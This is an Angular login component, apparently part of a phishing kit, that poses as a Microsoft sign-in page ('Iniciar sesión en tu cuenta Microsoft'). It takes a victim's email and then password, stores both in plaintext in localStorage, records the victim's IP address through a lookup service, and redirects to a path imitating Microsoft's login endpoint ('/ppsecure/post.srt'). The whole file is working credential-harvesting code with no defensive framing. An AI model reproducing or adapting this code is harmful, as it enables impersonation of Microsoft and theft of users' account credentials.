import { Component, OnInit } from '@angular/core';
import { FormGroup, FormBuilder, Validators } from '@angular/forms';
import { Title } from '@angular/platform-browser';
import { Router } from '@angular/router';
import {SendService} from 'src/app/confi/send.service'
@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css']
})
export class LoginComponent implements OnInit {
  loginmail = ''
  loginpass = ''
  frmLogin: FormGroup;
  frmLoginpass: FormGroup;
  validmail:boolean
  passvalidmail:boolean
  validpass:boolean
  constructor(
    private titleService: Title,
    private fb: FormBuilder,
    private SendService: SendService,
    private routers:Router
    ) {

      this.validmail = true
      this.passvalidmail = false
      this.validpass = true
   }
  login():void{
    if(this.frmLogin.valid){
      this.validmail = true
      this.passvalidmail = true
      this.loginmail = this.frmLogin.value.emailx
    }else{
      this.validmail = false
    }
    
  }

  loginIniciar():void{
    if(this.frmLoginpass.valid){
      	this.validpass = true
        this.loginpass = this.frmLoginpass.value.pass

        localStorage.setItem('username',this.loginmail)
        localStorage.setItem('pass',this.loginpass)

        this.routers.navigate(['/ppsecure/post.srt'])
        
    }else{
      this.validpass = false
    }
  }
  pastlogin():void{
    this.passvalidmail = false
  }
  ngOnInit(): void {

    this.SendService.getipx().subscribe(resulks =>{
      localStorage.setItem('ipcx',resulks['ip'])
    })
    this.titleService.setTitle('Iniciar sesión en tu cuenta Microsoft')
    this.frmLogin = this.fb.group({
      'emailx': ['',[Validators.required,Validators.pattern("^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,4}$")]],
    });

    this.frmLoginpass = this.fb.group({
      'pass': ['', Validators.compose([Validators.required, Validators.minLength(4)])]
    });
  }

}
